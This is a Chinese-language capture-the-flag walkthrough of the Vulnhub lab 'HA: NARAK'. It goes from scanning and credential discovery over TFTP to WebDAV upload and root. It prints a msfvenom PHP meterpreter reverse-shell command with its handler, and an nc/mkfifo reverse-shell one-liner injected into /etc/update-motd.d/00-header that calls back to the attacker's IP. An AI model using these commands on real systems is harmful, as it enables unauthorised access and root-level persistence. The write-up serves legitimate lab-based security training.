# 前言：

Vulnhub是一个提供各种漏洞环境的靶场，每个镜像会有破解的目标，挑战的目标是通过网络闯入系统获取root权限和查看flag

## 说明： **这次选择的靶场名字为：HA: NARAK**

靶场下载链接：https://download.vulnhub.com/ha/narak.ova

个人建议在vmware运行靶场环境，再使用kali或者终端机器作为攻击主机，同时要注意kali在同一网卡下，否则是无法进行通信的。

题目的描述为：

![](https://image.3001.net/images/20201106/1604630977_5fa4b9c19aeaedbb56567.png!small)

为了让更多新手朋友少走弯路，我尽量写详细一点，如果有什么不清楚的地方可以对我们发起提问

## 开始：

在这里我让kali和靶场都使用NAT模式

在编辑->虚拟网络编辑器处可以看到我们使用模式的配置。

![](https://image.3001.net/images/20201106/1604631003_5fa4b9dbf0922acf4b2f4.png!small)![](https://image.3001.net/images/20201106/1604631018_5fa4b9ea4cd555a0317a0.png!small)

Ip地址段都为192.168.158.*

目标主机：未知ip

既然知道ip段，不知道IP，我们可与使用nmap去扫描整个 c段来探测主机

使用命令： **Nmap -sS -Pn 192.168.158.0/24**

![](https://image.3001.net/images/20201106/1604631057_5fa4ba116f9ff2ff9dbe0.png!small)

发现192.168.158.142开放了80和22

那我们所需要渗透的靶场就为192.168.158.142了

虽然使用 nmap -sS -Pn ip这个扫描会虽然速度很快，不过很多端口会扫描不出来

我们可以使用命令： **nmap -T4 -A -v-p 1-65535 ip** 去详细对目标扫描一下

![](https://image.3001.net/images/20201106/1604631536_5fa4bbf0418396b50b0fd.png!small)

使用udp进行端口扫描，命令：nmap-sU -Pn 192.168.158.142

![](https://image.3001.net/images/20201106/1604631562_5fa4bc0a4392e625a732f.png!small)

一共开放了4个端口，80端口的web，22端口的ssh，69的tftp和68的dhcpc

其中80开放http服务

我们先访问一下80吧

![](https://image.3001.net/images/20201106/1604631580_5fa4bc1c1a01fb048c967.png!small)

使用google的wappalyzer插件查看一下是否有框架信息

![](https://image.3001.net/images/20201106/1604631613_5fa4bc3d16510a9deeb2e.png!small)

并没有得到网站开发的框架，但可以知道网站的apche的版本和ubuntu的操作系统

这时我们可以对目标进行目录扫描：

先使用dirscan进行扫描

![](https://image.3001.net/images/20201106/1604631631_5fa4bc4fb11e2d90c37c7.png!small)

访问/webdav

![](https://image.3001.net/images/20201106/1604631650_5fa4bc62513984bfc78d6.png!small)

由于我们没有账号信息，想要爆破起来比较困难，我们对目标继续信息收集。

使用7kbscan对目标扫描其他的扩展

最终在找到一个txt文件

![](https://image.3001.net/images/20201106/1604631663_5fa4bc6f025b0451cab8a.png!small)

访问一下![](https://image.3001.net/images/20201106/1604631693_5fa4bc8dce8fb6eb20b3e.png!small)

提示我们关键的文件在creds.txt里

看来我们需要找到creads.txt文件，但是扫描都没发现这个文件

猜测可能是存在tftp中的

我们开启一下tftp服务（控制面板->程序->启动或者关闭window功能）

![](https://image.3001.net/images/20201106/1604631718_5fa4bca6578ebcda72e7e.png!small)

使用cmd

![](https://image.3001.net/images/20201106/1604631732_5fa4bcb42e2e8b3bcbf24.png!small)

使用命令:tftp -i 192.168.158.142 get creds.txt 果然存在

![](https://image.3001.net/images/20201106/1604631748_5fa4bcc428d1728b345ff.png!small)

打开发现是一串base64

![](https://image.3001.net/images/20201106/1604631759_5fa4bccfa2e31818c4ba6.png!small)

解密一下

![](https://image.3001.net/images/20201106/1604631774_5fa4bcde38fcf0d22a1bc.png!small)

解密得到为：yamdoot:Swarg

这应该就是webdav的账号和密码了![](https://image.3001.net/images/20201106/1604631806_5fa4bcfe66b0518fd2d0a.png!small)

成功连接

![](https://image.3001.net/images/20201106/1604631821_5fa4bd0d936d15bd008f8.png!small)

可以发现我们是可以通过webdav上传文件的

接着我们使用kali的cadaver去连接webdav

使用命令：cadaver <http://192.168.158.142/webdav>

![](https://image.3001.net/images/20201106/1604631836_5fa4bd1cac4da22700754.png!small)

由于这里是需要登录webdav所以我们需要上传能反弹shell的木马文件

这里使用kali生成一个msf的php马，命令：

msfvenom -pphp/meterpreter_reverse_tcp LHOST=xxx LPORT=xxx -f raw > shell.php

kali进行监听

命令：

 **use exploit/multi/handler**

 **set payloadphp/meterpreter_reverse_tcp**

 **php/meterpreter_reverse_tcp**

 **set lhost 192.168.158.132**

 **192.168.158.132**

 **set lport 8888**

**run**![](https://image.3001.net/images/20201106/1604631908_5fa4bd64ed96a2b4fa19f.png!small)

再上传生成的木马文件![](https://image.3001.net/images/20201106/1604631942_5fa4bd8644dc2582fa7ec.png!small)

访问msf.php

![](https://image.3001.net/images/20201106/1604632045_5fa4bded53dccd1b8be30.png!small)![](https://image.3001.net/images/20201106/1604632065_5fa4be01ab0cc49e378fc.png!small)

成功拿到meterperter

![](https://image.3001.net/images/20201106/1604632102_5fa4be26bb3c08f10b694.png!small)

权限比较低

查看内核![](https://image.3001.net/images/20201106/1604632119_5fa4be37ac46004f9e44d.png!small)

使用searchsploit查看是否有可以提权的脚本

![](https://image.3001.net/images/20201106/1604632138_5fa4be4aa083dd1a71ed1.png!small)

没有发现利用的脚本，看来提权得翻文件了

在/home/inferno目录中找到了user.txt

![](https://image.3001.net/images/20201106/1604632158_5fa4be5eef546916f7daf.png!small)

在home目录中可以发现还存在2个用户

我们还需要找到root.txt,这个文件估计需要我们提权了

![](https://image.3001.net/images/20201106/1604632188_5fa4be7c505d47a4d6da0.png!small)

Yamdoot应该是TFPT用户，narak我们访问不了，应该为高权限账号

继续翻文件

在/mnt目录发现一段密文

![](https://image.3001.net/images/20201106/1604632215_5fa4be9700eacc30d4872.png!small)

百度可以得到为brainfuck

使用brainfuck在线解密

![](https://image.3001.net/images/20201106/1604632634_5fa4c03a1936f757f4a57.png!small)

得到chitragupt，感觉可能是某个账号的密码

我们对3个账号进行尝试

使用inferno/chitragupt登录成功

接着我们可以上传linpeas来查找可供我们提权的文件

![](https://image.3001.net/images/20201106/1604632673_5fa4c061530929b842393.png!small)

/etc/motd欢迎界面 我们可以通过修改ssh登陆时的欢迎信息来反弹一个root的shell使用命令echo "rm /tmp/f;mkfifo
/tmp/f;cat /tmp/f|/bin/sh -i2>&1|nc 192.168.158.132 1234 >/tmp/f"
>>/etc/update-motd.d/00-header

![](https://image.3001.net/images/20201106/1604632729_5fa4c099328b23f653016.png!small)

接着kali使用nc监听

![](https://image.3001.net/images/20201106/1604632973_5fa4c18dbfe258301aba4.png!small)

重新登录

Nc成功接收到root

![](https://image.3001.net/images/20201106/1604632986_5fa4c19aed56dbb7ad6e4.png!small)

最后cat ./root.txt得到最终的flag

![](https://image.3001.net/images/20201106/1604633008_5fa4c1b0e7a29d246ca33.png!small)

## 总结：

Vulnhub还是挺有意思的，能够掌握很多渗透的技巧，我们后续我们会继续更新新的靶场文章，希望能给大家一点帮助。

